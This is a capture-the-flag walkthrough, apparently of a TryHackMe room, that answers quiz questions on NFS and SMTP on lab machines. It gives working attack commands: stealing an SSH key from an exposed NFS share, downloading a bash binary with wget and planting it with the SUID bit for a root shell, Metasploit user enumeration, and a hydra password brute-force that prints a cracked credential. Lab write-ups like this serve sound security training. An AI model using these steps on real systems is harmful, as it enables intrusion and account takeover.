#Task 2 Understanding NFS 
- What does NFS stand for?
Network File System

- What process allows an NFS client to interact with a remote directory as though it was a physical device?
mounting

- What does NFS use to represent files and directories on the server?
file handle


- What protocol does NFS use to communicate between the server and client?
RPC


- What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2
user id / group id

- Can a Windows NFS server share files with a Linux client? (Y/N)
Y

- Can a Linux NFS server share files with a MacOS client? (Y/N)
Y

- What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.

4.2


#Task 3 Enumerating NFS 
- Conduct a thorough port scan scan of your choosing, how many ports are open?
hint: nmap -A -p- -Pn -vv $ip
7


- Which port contains the service we're looking to enumerate?
2049


- Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
hint: #showmount -e $IP
/home


Time to mount the share to our local machine!
First, use "mkdir /tmp/mount" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.
- Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?

hint: cd /tmp/mount
ls
cappuchino


- Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?
.ssh


- Which of these keys is most useful to us?
id_rsa


- Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".
Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.
Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)
hint:
cd /tmp/mount/cappuchino
cd .ssh
cat id_rsa.pub
ssh -i id_rsa cappuchino@ip
Y


#Task 4 Exploiting NFS 
On local mounted machine target
#wget https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
#cp bash /tmp/mount/cappuchino
chown root bash
chmod +s bash
ls -l bash
-rwSr-Sr-x 1 root root 1113504 Jul  4 23:12 bash


- Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?
s


- Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.
-rwSr-Sr-x

Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

- Great! If all's gone well you should have a shell as root! What's the root flag?
ssh -i id_rsa cappuchino@$ip
./bash -p
cat /root/root.txt

#Task 5 Understanding SMTP 
- What does SMTP stand for?
Simple Mail Transfer Protocol


- What does SMTP handle the sending of?
emails



- What is the first step in the SMTP process?
SMTP handshake



- What is the default SMTP port?
25



- Where does the SMTP server send the email if the recipient's server is not available?
smtp queue



- On what server does the Email ultimately end up on?
POP/IMAP



- Can a Linux machine run an SMTP server? (Y/N)
Y


- Can a Windows machine run an SMTP server? (Y/N)
Y



#Task 6 Enumerating SMTP 
- First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?
hint: nmap -sSVC -Pn -vv $IP
25



- Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?
If you would like some more help, or practice using, Metasploit, Darkstar has an amazing room on Metasploit that you can check out here:
https://tryhackme.com/room/rpmetasploit
msfconsole


- Let's search for the module "smtp_version", what's it's full module name? 
hint: msfconsole>search smtp_version
auxiliary/scanner/smtp/smtp_version



- Great, now- select the module and list the options. How do we do this?
options


- Have a look through the options, does everything seem correct? What is the option we need to set?
RHOSTS


- Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?
hint: set rhosts 10.10.131.113
set threads 32
run
polosmtp.home



- What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.
hint: https://afreshcloud.com/sysadmin/mail-terminology-mta-mua-msa-mda-smtp-dkim-spf-dmarc
Postfix


- Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "smtp_enum", what's it's full module name?
hint: msfconsole>search smtp_enum
auxiliary/scanner/smtp/smtp_enum


We're going to be using the "top-usernames-shortlist.txt" wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed).
Seclists is an amazing collection of wordlists. If you're running Kali or Parrot you can install seclists with: "sudo apt install seclists" Alternatively, you can download the repository from here.
- What option do we need to set to the wordlist's path?
hint: apt install seclists
find / -type f -name "top-usernames-shortlist.txt" 2>/dev/null
user_file


- Once we've set this option, what is the other essential paramater we need to set?
rhosts


- Okay! Now that's finished, what username is returned?
hint: set user_file /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set threads 32
run
administrator


#Task 7 Exploiting SMTP 
- What is the password of the user we found during our enumeration stage?
hint: hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.131.113 ssh
[22][ssh] host: 10.10.131.113   login: administrator   password: alejandro
alejandro


- Great! Now, let's SSH into the server as the user, what is contents of smtp.txt
hint: ssh administrator@10.10.131.113
cat smtp.txt
